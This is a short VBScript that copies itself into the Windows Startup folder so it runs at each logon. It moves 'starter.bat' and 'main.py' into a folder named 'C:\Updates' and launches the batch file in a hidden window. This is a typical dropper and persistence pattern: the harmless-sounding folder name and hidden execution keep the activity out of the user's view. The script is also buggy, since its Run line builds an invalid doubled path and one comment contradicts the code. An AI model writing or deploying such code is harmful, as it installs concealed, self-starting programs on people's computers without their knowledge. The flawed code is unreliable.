Set objFSO = CreateObject("Scripting.FileSystemObject")
Set objShell = CreateObject("WScript.Shell")

' Get the current user's startup folder
strStartupFolder = objShell.SpecialFolders("Startup")

' Create the folder path in the startup folder
strFolderPath = "C:\Updates"

' Check if the folder doesn't already exist
If Not objFSO.FolderExists(strFolderPath) Then
    ' Create the folder
    objFSO.CreateFolder strFolderPath
End If

' Move this VBScript file to the startup folder
objFSO.MoveFile WScript.ScriptFullName, strStartupFolder & "\a.vbs"

' Move starter.bat
objFSO.MoveFile "starter.bat", strFolderPath & "\starter.bat"

' Move main.py (assuming it's in the same directory as this script)
objFSO.MoveFile objFSO.GetParentFolderName(WScript.ScriptFullName) & "\main.py", strFolderPath & "\main.py"

' Run starter.bat
objShell.Run strFolderPath & "C:\Updates\starter.bat", 0, True
